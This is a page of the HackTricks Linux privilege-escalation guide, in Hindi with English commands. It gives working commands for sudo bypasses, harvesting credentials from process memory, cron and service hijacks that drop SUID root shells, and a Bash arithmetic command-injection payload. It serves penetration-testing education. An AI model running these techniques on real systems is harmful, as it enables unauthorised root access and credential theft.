# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## System Information

### OS info

आइए चल रहे OS के बारे में कुछ जानकारी प्राप्त करना शुरू करें.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास `PATH` variable के अंदर मौजूद किसी भी folder पर **write permissions** हैं, तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version check करें और देखें कि privileges escalate करने के लिए कोई exploit इस्तेमाल किया जा सकता है या नहीं.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आपको vulnerable kernels की एक अच्छी list और कुछ पहले से **compiled exploits** यहां मिल सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)।\
कुछ **compiled exploits** पाने वाली अन्य sites: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस web से सभी vulnerable kernel versions extract करने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
वे Tools जो kernel exploits खोजने में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, केवल kernel 2.x के exploits check करता है)

हमेशा **kernel version को Google पर search करें**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आपको यकीन हो जाएगा कि यह exploit valid है।

Additional kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

इनमें दिखाई देने वाले vulnerable sudo versions के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo का version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 से पहले के Sudo versions (**1.9.14 - 1.9.17 < 1.9.17p1**) unprivileged local users को root तक अपने privileges escalate करने की अनुमति देते हैं, जब `/etc/nsswitch.conf` file को user controlled directory से उपयोग किया जाता है और sudo `--chroot` option का उपयोग किया जाता है।

इस [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) के माध्यम से उस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit किया जा सकता है। Exploit चलाने से पहले सुनिश्चित करें कि आपका `sudo` version vulnerable है और यह `chroot` feature को support करता है।

अधिक जानकारी के लिए मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 से पहले का Sudo (reported affected range: **1.8.8–1.9.17**) host-based sudoers rules का evaluation `sudo -h <host>` से दिए गए **user-supplied hostname** के आधार पर कर सकता है, न कि **real hostname** के आधार पर। यदि sudoers किसी अन्य host पर अधिक व्यापक privileges प्रदान करता है, तो आप उस host को locally **spoof** कर सकते हैं।

आवश्यकताएँ:
- Vulnerable sudo version
- Host-specific sudoers rules (host न तो current hostname है और न ही `ALL`)

sudoers pattern का उदाहरण:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
अनुमत host को spoof करके exploit करें:
```bash
sudo -h devbox id
sudo -h devbox -i
```
यदि spoof किए गए नाम का resolution अटकता है, तो उसे `/etc/hosts` में जोड़ें या ऐसा hostname उपयोग करें जो logs/configs में पहले से दिखाई देता हो, ताकि DNS lookups से बचा जा सके।

#### sudo < v1.8.28

@ सिकलरोव द्वारा
```
sudo -u#-1 /bin/bash
```
### Dmesg हस्ताक्षर सत्यापन विफल

इस vuln का exploitation कैसे किया जा सकता है, इसका एक **उदाहरण** देखने के लिए **HTB के smasher2 box** को देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों की गणना करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

यदि आप किसी container के अंदर हैं, तो निम्नलिखित container-security section से शुरुआत करें और फिर runtime-specific abuse pages पर pivot करें:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

जाँचें कि **क्या mounted और unmounted है**, कहाँ और क्यों। यदि कुछ unmounted है, तो आप उसे mount करके private info की जाँच करने का प्रयास कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
यह भी जाँचें कि **कोई compiler installed है या नहीं**। यदि आपको किसी kernel exploit का उपयोग करना हो, तो यह उपयोगी है, क्योंकि इसे उस machine पर compile करने की सिफारिश की जाती है जहाँ आप इसका उपयोग करने वाले हैं (या किसी समान machine पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

**installed packages and services के version** की जाँच करें। हो सकता है कि Nagios का कोई पुराना version हो, जिसका privileges escalate करने के लिए exploitation किया जा सके…\
अधिक संदिग्ध installed software के version को manually जाँचना recommended है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन का SSH access है, तो आप मशीन के अंदर installed outdated और vulnerable software की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी ऐसी information दिखाएँगी जो अधिकतर बेकार होगी, इसलिए OpenVAS या इसी तरह के कुछ applications का उपयोग करने की सलाह दी जाती है, जो यह जाँच सकें कि installed software का कोई version ज्ञात exploits के प्रति vulnerable है या नहीं_

## Processes

देखें कि **कौन-सी प्रक्रियाएँ** execute हो रही हैं और जाँचें कि क्या किसी process के पास **उससे अधिक privileges हैं जितने होने चाहिए** (शायद कोई tomcat root द्वारा execute किया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा [**electron/cef/chromium debuggers** चल रहे हैं या नहीं, इसकी जाँच करें; आप privileges escalate करने के लिए उनका abuse कर सकते हैं](../../software-information/electron-cef-chromium-debugger-abuse.md)। **Linpeas** process की command line में `--inspect` parameter की जाँच करके इन्हें detect करता है।\
साथ ही **processes की binaries पर अपने privileges भी जाँचें**, शायद आप किसी की binary overwrite कर सकें।

### Cross-user parent-child chains

किसी **different user** के अंतर्गत चल रहा child process, उसके parent से अलग user के अंतर्गत होने पर, अपने-आप malicious नहीं होता, लेकिन यह एक उपयोगी **triage signal** है। कुछ transitions expected होते हैं (`root` द्वारा service user को spawn करना, login managers द्वारा session processes बनाना), लेकिन unusual chains wrappers, debug helpers, persistence या कमजोर runtime trust boundaries को उजागर कर सकती हैं।

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
यदि आपको कोई आश्चर्यजनक chain मिलती है, तो parent command line और उन सभी files का निरीक्षण करें जो इसके behavior को प्रभावित करती हैं (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments)। कई वास्तविक privesc paths में child स्वयं writable नहीं था, लेकिन **parent-controlled config** या helper chain writable थी।

### Deleted executables और deleted-open files

Runtime artifacts अक्सर **deletion के बाद भी** accessible रहते हैं। यह privilege escalation और ऐसे process से evidence recover करने, जिसके पास पहले से sensitive files open हों, दोनों के लिए उपयोगी है।

Deleted executables की जाँच करें:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
यदि `/proc/<PID>/exe` `(deleted)` की ओर संकेत करता है, तो process अभी भी memory से पुराने binary image को चला रहा है। यह जाँच करने का एक मजबूत संकेत है क्योंकि:

- हटाए गए executable में उपयोगी strings या credentials हो सकते हैं
- running process अभी भी उपयोगी file descriptors expose कर सकता है
- हटाया गया privileged binary हाल की tampering या cleanup के प्रयास का संकेत दे सकता है

सभी deleted-open files को globally collect करें:
```bash
lsof +L1
```
यदि आपको कोई दिलचस्प descriptor मिले, तो उसे सीधे recover करें:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
यह विशेष रूप से तब मूल्यवान होता है जब किसी process में अभी भी कोई deleted secret, script, database export या flag file खुली हो।

### Process monitoring

आप processes को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह बार-बार execute होने वाले vulnerable processes की पहचान करने में या requirements का कोई set पूरा होने पर बहुत उपयोगी हो सकता है।

### Process memory

किसी server की कुछ services **credentials को memory के अंदर clear text में save करती हैं**।\
आमतौर पर दूसरे users के processes की memory पढ़ने के लिए आपको **root privileges** की आवश्यकता होगी, इसलिए यह तब अधिक उपयोगी होता है जब आप पहले से root हों और अधिक credentials discover करना चाहते हों।\
हालांकि, याद रखें कि **एक regular user के रूप में आप अपने स्वामित्व वाले processes की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश machines **default रूप से ptrace की अनुमति नहीं देतीं**, जिसका अर्थ है कि आप अपने unprivileged user से संबंधित अन्य processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, जब तक उनका uid समान हो। ptracing के काम करने का यह classical तरीका था।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। एक बार set होने के बाद, ptracing को फिर से enable करने के लिए reboot आवश्यक है।

#### GDB

यदि आपके पास किसी FTP service की memory तक access है (उदाहरण के लिए), तो आप उसका Heap प्राप्त कर सकते हैं और उसके credentials को खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps और /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps यह दिखाता है कि उस process के** virtual address space **में memory किस प्रकार mapped है**; यह **प्रत्येक mapped region की permissions** भी दिखाता है। **mem** pseudo file **process की memory को स्वयं expose करती है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable** हैं और उनके offsets क्या हैं। हम इस जानकारी का उपयोग **mem file में seek करने और सभी readable regions को** एक file में dump करने के लिए करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** memory तक access प्रदान करता है, virtual memory तक नहीं। Kernel के virtual address space को /dev/kmem का उपयोग करके access किया जा सकता है।\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा readable होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux के लिए ProcDump

ProcDump, Windows के लिए Sysinternals suite of tools के classic ProcDump tool का Linux संस्करण है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

किसी process की memory dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप manually root requirements हटा सकते हैं और अपने द्वारा owned process की dump कर सकते हैं
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) की Script A.5 (root आवश्यक है)

### Process Memory से Credentials

#### Manual उदाहरण

यदि आपको पता चलता है कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (process की memory dump करने के विभिन्न तरीकों के लिए पिछले sections देखें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **memory से clear text credentials चुरा** सकता है और कुछ **well known files** से भी credentials प्राप्त कर सकता है। इसे ठीक से काम करने के लिए root privileges की आवश्यकता होती है।

| विशेषता                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

यदि कोई web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से bound है, तो भी आप SSH local port-forwarding के माध्यम से उस तक पहुँच सकते हैं और privilege escalation के लिए एक privileged job बना सकते हैं।

Typical chain
- `ss -ntlp` / `curl -v localhost:8000` के माध्यम से loopback-only port (जैसे 127.0.0.1:8000) और Basic-Auth realm खोजें
- operational artifacts में credentials खोजें:
- `zip -P <password>` वाले Backups/scripts
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` को expose करने वाली systemd unit
- Tunnel करें और login करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (SUID shell ड्रॉप करता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; dedicated user और minimal permissions के साथ सीमित करें
- localhost से bind करें और अतिरिक्त रूप से firewall/VPN के माध्यम से access प्रतिबंधित करें; passwords को reuse न करें
- unit files में secrets embed करने से बचें; secret stores या केवल root द्वारा पढ़ी जा सकने वाली EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें



जाँचें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा execute की जा रही किसी script का लाभ उठा सकें (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिन्हें root उपयोग करता है? क्या symlinks का उपयोग कर सकते हैं? क्या root द्वारा उपयोग की जाने वाली directory में specific files बना सकते हैं?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
यदि `run-parts` का उपयोग किया गया है, तो जाँचें कि वास्तव में कौन-से नाम निष्पादित होंगे:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
यह false positives से बचाता है। Writable periodic directory तभी उपयोगी होती है जब आपके payload का filename स्थानीय `run-parts` rules से मेल खाता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आपको PATH मिल सकता है: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर writing privileges हैं_)

यदि इस crontab के अंदर root user path सेट किए बिना किसी command या script को execute करने का प्रयास करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो आप इसका उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई script root द्वारा execute की जाती है और किसी command के अंदर “**\***” मौजूद है, तो आप इसका exploit करके unexpected चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard से पहले** _**/some/path/\***_ **जैसा कोई path हो, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

अधिक wildcard exploitation tricks के लिए निम्न page पढ़ें:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash `((...))`, `$((...))` और `let` में arithmetic evaluation से पहले parameter expansion और command substitution करता है। यदि कोई root cron/parser untrusted log fields पढ़कर उन्हें arithmetic context में डालता है, तो attacker `$(...)` command substitution inject कर सकता है, जो cron चलने पर root के रूप में execute होता है।

- यह क्यों काम करता है: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion। इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसी value को पहले substitute किया जाता है (जिससे command चलती है), फिर बचा हुआ numeric `0` arithmetic के लिए उपयोग होता है, जिससे script errors के बिना जारी रहती है।

- सामान्य vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled text लिखवाएँ, ताकि numeric-looking field में command substitution हो और उसका अंत किसी digit से हो। सुनिश्चित करें कि आपकी command stdout पर कुछ print न करे (या उसे redirect करें), ताकि arithmetic valid बना रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप root द्वारा execute की जाने वाली cron script को **modify कर सकते हैं**, तो shell प्राप्त करना बहुत आसान है:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा execute की गई **script** ऐसी **directory** का उपयोग करती है जहाँ आपका **full access** है, तो शायद उस **folder** को delete करके और किसी अन्य **folder** के लिए **symlink folder** create करना उपयोगी हो सकता है, जो आपके द्वारा **controlled** **script** serve करता हो
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation और सुरक्षित file handling

Privileged scripts/binaries की समीक्षा करते समय, जो path के आधार पर files को read या write करते हैं, यह verify करें कि links को कैसे handle किया जाता है:

- `stat()` symlink को follow करता है और target का metadata लौटाता है।
- `lstat()` स्वयं link का metadata लौटाता है।
- `readlink -f` और `namei -l` final target को resolve करने और प्रत्येक path component की permissions दिखाने में सहायता करते हैं।
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Defenders/developers के लिए, symlink tricks से बचने वाले सुरक्षित patterns में शामिल हैं:

- `O_EXCL` को `O_CREAT` के साथ उपयोग करें: यदि path पहले से मौजूद हो तो विफल हो जाए (attacker द्वारा पहले से बनाए गए links/files को रोकता है)।
- `openat()`: trusted directory file descriptor के सापेक्ष कार्य करें।
- `mkstemp()`: secure permissions के साथ temporary files को atomically create करें।

### Writable payloads वाले custom-signed cron binaries

Blue teams कभी-कभी cron-driven binaries को execute करने से पहले custom ELF section dump करके और vendor string के लिए grep करके "sign" करती हैं, और फिर उन्हें root के रूप में execute करती हैं। यदि वह binary group-writable हो (जैसे, `/opt/AV/periodic-checks/monitor`, जिसका owner `root:devs 770` हो) और आप signing material को leak कर सकें, तो आप section forge करके cron task को hijack कर सकते हैं:

1. Verification flow capture करने के लिए `pspy` का उपयोग करें। Era में root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` चलाया और फिर file को execute किया।
2. Leaked key/config (`signing.zip` से) का उपयोग करके expected certificate को recreate करें:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (जैसे, SUID bash drop करना या अपनी SSH key जोड़ना) और certificate को `.text_sig` में embed करें ताकि grep सफल हो जाए:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Execute bits को preserve करते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतज़ार करें; naive signature check सफल होते ही आपका payload root के रूप में run होगा।

### Frequent cron jobs

आप processes को monitor करके उन processes को खोज सकते हैं जो हर 1, 2 या 5 मिनट में execute हो रहे हैं। संभव है कि आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1s monitor करने**, **कम execute किए गए commands के अनुसार sort करने** और सबसे अधिक execute किए गए commands को हटाने के लिए, आप यह कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप [**pspy**](https://github.com/DominicBreuker/pspy/releases) का भी उपयोग कर सकते हैं (यह शुरू होने वाली हर process को monitor और list करेगा)।

### Root backups जो attacker-set mode bits को preserve करते हैं (pg_basebackup)

यदि root-owned cron किसी ऐसे database directory पर `pg_basebackup` (या कोई recursive copy) चलाता है, जिस पर आप write कर सकते हैं, तो आप एक **SUID/SGID binary** रख सकते हैं, जिसे समान mode bits के साथ backup output में **root:root** के रूप में दोबारा copy किया जाएगा।

एक सामान्य discovery flow (low-priv DB user के रूप में):
- `pspy` का उपयोग करके ऐसा root cron खोजें जो हर मिनट `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` जैसा command call करता हो।
- Source cluster (जैसे `/var/lib/postgresql/14/main`) पर आपके write permissions होने की पुष्टि करें और यह भी जाँचें कि job के बाद destination (`/opt/backups/current`) का owner root हो जाता है।

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
यह इसलिए काम करता है क्योंकि `pg_basebackup` cluster को कॉपी करते समय file mode bits को सुरक्षित रखता है; जब इसे root द्वारा चलाया जाता है, तो destination files को **root ownership + attacker-chosen SUID/SGID** विरासत में मिलते हैं। permissions को सुरक्षित रखते हुए executable location में लिखने वाली कोई भी समान privileged backup/copy routine vulnerable होती है।

### Invisible cron jobs

एक cronjob बनाना संभव है **comment के बाद carriage return रखकर** (बिना newline character के), और cron job काम करेगी। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
इस प्रकार की stealth entry का पता लगाने के लिए, cron files को ऐसे tools से inspect करें जो control characters दिखाते हैं:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### लिखने योग्य _.service_ files

जाँचें कि क्या आप किसी `.service` file में write कर सकते हैं। यदि कर सकते हैं, तो आप इसे **modify कर सकते हैं**, ताकि **service के **started**, **restarted** या **stopped** होने पर आपका **backdoor execute** हो** (संभवतः आपको machine के reboot होने तक wait करना पड़ेगा)।\
उदाहरण के लिए, .service file के अंदर अपना backdoor इस तरह create करें: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि यदि आपके पास services द्वारा execute की जाने वाली **binaries पर write permissions** हैं, तो आप backdoors के लिए उन्हें बदल सकते हैं, ताकि services के दोबारा **execute** होने पर backdoors execute हो जाएँ।

### systemd PATH - Relative Paths

आप इस command से **systemd** द्वारा उपयोग किया जाने वाला PATH देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी folder में **write** कर सकते हैं, तो आप **escalate privileges** कर पाने में सक्षम हो सकते हैं। आपको इस तरह की service configurations files में उपयोग किए जा रहे **relative paths** को खोजना होगा:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
